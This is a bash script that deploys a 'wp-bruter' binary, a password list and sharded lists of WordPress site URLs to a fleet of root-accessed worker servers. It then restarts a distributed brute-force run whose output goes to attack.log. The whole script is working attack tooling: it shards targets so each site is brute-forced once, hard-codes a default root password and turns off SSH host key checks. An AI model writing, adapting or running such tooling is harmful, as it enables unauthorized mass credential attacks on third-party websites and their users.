#!/bin/bash
# Deploy the current wp-bruter binary to the worker fleet and restart the run.
#
# The target list is sharded by a stable hash of the URL so every site is
# brute-forced once across the fleet instead of once per worker. Each worker
# keeps its own progress file (resume still works across redeploys).
#
# Workers only accept password auth; set WORKER_PASS to override.
# Tuning knobs are env vars: WORKERS_PER_BOX, ACTIVE_PER_BOX, PREP_PER_BOX.
set -u

WORKER_PASS="${WORKER_PASS:-fahrel}"
WORKERS_PER_BOX="${WORKERS_PER_BOX:-4000}"
ACTIVE_PER_BOX="${ACTIVE_PER_BOX:-8000}"
PREP_PER_BOX="${PREP_PER_BOX:-512}"
PHASES="${PHASES:-150 500 0}"
SITES_FILE="${SITES_FILE:-/root/wordpress.txt}"
LOCAL_SITES="${LOCAL_SITES:-wordpress.txt}"
FLEET_FILE="${FLEET_FILE:-$(dirname "$0")/fleet.txt}"
WORKERS=()
while IFS= read -r ip; do
    case "$ip" in ''|'#'*) continue ;; esac
    WORKERS+=("$ip")
done < "$FLEET_FILE"
[ ${#WORKERS[@]} -gt 0 ] || { echo "empty fleet: $FLEET_FILE" >&2; exit 1; }

SSH_OPTS=(-o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=10)
ssh_cmd() { sshpass -p "$WORKER_PASS" ssh "${SSH_OPTS[@]}" "root@$1" "${@:2}"; }
scp_cmd() { sshpass -p "$WORKER_PASS" scp -O "${SSH_OPTS[@]}" "$1" "root@$2:$3"; }

N=${#WORKERS[@]}
SHARD_DIR=$(mktemp -d)
trap 'rm -rf "$SHARD_DIR"' EXIT

# Pre-flight: only shard across boxes that answer right now, so a dead host
# does not silently swallow a shard of the list.
LIVE=()
for WORKER in "${WORKERS[@]}"; do
    if ssh_cmd "$WORKER" 'true' 2>/dev/null; then
        LIVE+=("$WORKER")
    else
        echo "[$WORKER] unreachable — dropped"
    fi
done
[ ${#LIVE[@]} -gt 0 ] || { echo "no live workers" >&2; exit 1; }
WORKERS=("${LIVE[@]}")
N=${#WORKERS[@]}
echo "pre-flight: ${#WORKERS[@]} live workers"

# Stable hash -> shard index, so a site does not move when the fleet size
# changes. Sort then split; the stray index prefix is stripped.
CHARS="abcdefghijklmnopqrstuvwxyz0123456789.-_:/"
awk -v n="$N" -v chars="$CHARS" '{
    h = 0; line = tolower($0)
    for (i = 1; i <= length(line); i++) { h = (h * 31 + index(chars, substr(line, i, 1))) % 1000003 }
    print h % n, $0
}' "$LOCAL_SITES" | sort -k1,1n -s | awk -v d="$SHARD_DIR" -v n="$N" '
    { idx = $1; sub(/^[0-9]+ /, ""); print > (d "/" idx ".txt") }
    END { for (i = 0; i < n; i++) close(d "/" i ".txt") }'

TOTAL=0
for i in $(seq 0 $((N - 1))); do
    lines=$(wc -l < "$SHARD_DIR/$i.txt")
    TOTAL=$((TOTAL + lines))
    echo "shard $i: $lines sites"
done
TOTAL_SITES=$(wc -l < "$LOCAL_SITES")
echo "sharded $TOTAL/$TOTAL_SITES sites across $N workers"

ALL=0
idx=0
for WORKER in "${WORKERS[@]}"; do
    SHARD="$SHARD_DIR/$idx.txt"
    echo "[$WORKER] shard $idx ($(wc -l < "$SHARD") sites)"
    (
        ssh_cmd "$WORKER" "mkdir -p /opt/wp-bruter" 2>/dev/null || echo '  ❌ mkdir failed'
        # The running executable cannot be overwritten in place (ETXTBSY):
        # upload beside it and rename.
        for try in 1 2 3; do
            scp_cmd wp-bruter "$WORKER" /opt/wp-bruter/wp-bruter.new 2>/dev/null && break
            sleep 1
        done
        scp_cmd pass.txt "$WORKER" /opt/wp-bruter/pass.txt 2>/dev/null
        scp_cmd run.sh "$WORKER" /opt/wp-bruter/run.sh 2>/dev/null
        scp_cmd "$SHARD" "$WORKER" "/root/wordpress.s$idx" 2>/dev/null

        # Verify the binary survived the transfer before restarting anything.
        LOCAL_SUM=$(md5 -q wp-bruter 2>/dev/null || md5sum wp-bruter | cut -d' ' -f1)
        REMOTE_SUM=$(ssh_cmd "$WORKER" "md5sum /opt/wp-bruter/wp-bruter.new 2>/dev/null | cut -d' ' -f1")
        if [ "$LOCAL_SUM" != "$REMOTE_SUM" ]; then
            echo "  ❌ binary checksum mismatch (local $LOCAL_SUM, remote $REMOTE_SUM) — leaving old run"
            exit 0
        fi

        ssh_cmd "$WORKER" "
            # Progress is only meaningful for the exact same site shard; wipe it
            # when the shard hash changed (fleet size or list changed).
            SHARD_SUM=\$(md5sum /root/wordpress.s$idx | cut -d' ' -f1)
            [ \"\$SHARD_SUM\" = \"\$(cat /opt/wp-bruter/shard.sum 2>/dev/null)\" ] || rm -f /opt/wp-bruter/progress.txt
            echo \"\$SHARD_SUM\" > /opt/wp-bruter/shard.sum
            mv -f /opt/wp-bruter/wp-bruter.new /opt/wp-bruter/wp-bruter
            chmod +x /opt/wp-bruter/wp-bruter
            pkill -9 -f '^/bin/bash .*run[.]sh' 2>/dev/null || true
            pkill -9 -x wp-bruter 2>/dev/null || true
            # A SIGTERM drain can take a while (in-flight 5s requests); -9 is
            # immediate, but wait for the PID to disappear before restarting so
            # the new instance is not refused. -x, because the ssh session's own
            # `bash -c` line also contains the binary name.
            for i in \$(seq 1 30); do pgrep -x wp-bruter >/dev/null || break; sleep 1; done
            sleep 1
            mkdir -p /opt/wp-bruter
            echo '' > /opt/wp-bruter/debug.log
            cd /opt/wp-bruter
            chmod +x run.sh
            PHASES=\"$PHASES\" \
            WORKERS_PER_BOX=$WORKERS_PER_BOX \
            ACTIVE_PER_BOX=$ACTIVE_PER_BOX \
            PREP_PER_BOX=$PREP_PER_BOX \
            nohup ./run.sh $idx >> attack.log 2>&1 &
            sleep 2
            pgrep -x wp-bruter > /dev/null && echo '  ✅ Running' || echo '  ❌ Failed'
        " 2>/dev/null
    ) &
    idx=$((idx + 1))
done

wait
echo "✅ Deploy finished"
